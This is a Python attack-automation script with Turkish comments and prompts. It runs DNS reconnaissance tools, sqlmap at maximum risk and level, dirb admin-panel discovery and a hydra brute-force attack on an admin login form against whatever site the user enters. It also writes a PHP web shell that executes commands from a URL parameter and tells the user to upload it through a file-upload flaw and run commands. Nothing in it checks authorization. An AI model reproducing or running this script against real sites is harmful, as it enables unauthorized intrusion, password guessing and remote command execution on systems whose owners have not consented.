import subprocess
import random
import re
import json
import os

# Kullanıcıdan site ve portları al
site = input("URL'yi girin (http:// veya https:// olmadan): ").strip()

# URL doğrulama fonksiyonu
def is_valid_url(url):
    regex = re.compile(
        r'^(https?:\/\/)?'  # http:// veya https://
        r'(([A-Za-z0-9.-]+)\.([A-Za-z]{2,}))$'  # domain
    )
    return re.match(regex, url) is not None

if not is_valid_url(site):
    print("Geçersiz URL girdiniz!")
    exit()

# Birden fazla port girişi için input al ve liste oluştur
port_input = input("Açık Portları Girin (virgülle ayırarak): ").strip()
ports = [port.strip() for port in port_input.split(",") if port.strip().isdigit()]

# Rastgele port seç
random_port = random.choice(ports) if ports else None

# Çıktıları kaydetmek için JSON dosyası
output_file = "sorgu_sonuclari.json"

# Komut çalıştırma fonksiyonu
def run_command(command, description):
    print(f"\n### {description} ###\n")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    print(output)
    save_results(description, output)

# Sonuçları JSON dosyasına kaydetme fonksiyonu
def save_results(description, result):
    try:
        with open(output_file, "r", encoding="utf-8") as file:
            data = json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        data = {}

    data[description] = result
    with open(output_file, "w", encoding="utf-8") as file:
        json.dump(data, file, ensure_ascii=False, indent=4)

# Shell dosyası oluşturma fonksiyonu
def create_php_shell():
    shell_content = """<?php
    if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    } else {
        echo "Shell çalışıyor!";
    }
    ?>"""
    filename = "shell.php"
    with open(filename, "w") as file:
        file.write(shell_content)
    print(f"PHP shell dosyası '{filename}' oluşturuldu.")
    return filename

# usernames.txt dosyasını oluşturma
def create_usernames_file():
    usernames = ["admin", "root", "user", "test", "guest", "administrator", "manager"]
    filename = "usernames.txt"
    with open(filename, "w") as file:
        file.write("\n".join(usernames))
    print(f"Kullanıcı adı dosyası '{filename}' oluşturuldu.")
    return filename

# Dosyayı baştan temizle
with open(output_file, "w", encoding="utf-8") as file:
    json.dump({}, file, ensure_ascii=False, indent=4)

# 1. Bilgi Toplama
run_command(f"nslookup {site}", "nslookup Sonucu")
run_command(f"dig {site}", "dig Sonucu")
run_command(f"dnsrecon -d {site}", "dnsrecon Sonucu")
run_command(f"fierce -dns {site}", "fierce Sonucu")
run_command(f"traceroute {site}", "traceroute Sonucu")

# 2. Nmap ile Port Tarama ve Zafiyet Analizi
#if ports:
    #formatted_ports = ",".join(ports)
    #run_command(f"nmap -Pn -p {formatted_ports} {site}", f"nmap Sonucu ({formatted_ports})")
#run_command(f"nmap -Pn -sV --script=vuln {site}", "Nmap Zafiyet Taraması")

# 3. SQL Injection Testi
sql_test = input("\nSQL Injection testi yapmak istiyor musunuz? (E/h): ").strip().lower()
if sql_test == "e":
    run_command(f"sqlmap -u http://{site} --batch --risk=3 --level=5", "SQL Injection Test Sonucu")

# 4. Admin Paneli Keşfi
admin_panel_test = input("\nAdmin paneli taraması yapmak istiyor musunuz? (E/h): ").strip().lower()
if admin_panel_test == "e":
    run_command(f"dirb http://{site} /usr/share/wordlists/dirb/common.txt", "Admin Paneli Taraması Sonucu")

# 5. Brute Force Testi
brute_force_test = input("\nBrute force denemesi yapmak istiyor musunuz? (E/h): ").strip().lower()
if brute_force_test == "e":
    username_file = create_usernames_file()
    password_file = "/usr/share/wordlists/rockyou.txt"  # Varsayılan olarak rockyou.txt kullanılır

    run_command(f"hydra -L {username_file} -P {password_file} http-post-form \"/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect\" -V",
                "Brute Force Denemesi")

# 6. Dosya Yükleme Açığı Testi
upload_test = input("\nDosya yükleme açığını test etmek istiyor musunuz? (E/h): ").strip().lower()
if upload_test == "e":
    shell_file = create_php_shell()
    print("Shell dosyanız hazırlandı. Yükleme açığı bulunan alana şu dosyayı yükleyin:")
    print(f"\n{shell_file}")
    print(f"\nDaha sonra şu URL ile komut çalıştırabilirsiniz: http://{site}/uploads/{shell_file}?cmd=ls")

# Rastgele Port Bilgisi
if random_port:
    print(f"\n### Seçilen Rastgele Port: {random_port} ###\n")
    save_results("Seçilen Rastgele Port", random_port)

# Bilgilendirme
print(f"\nTüm sonuçlar '{output_file}' dosyasına kaydedildi.")

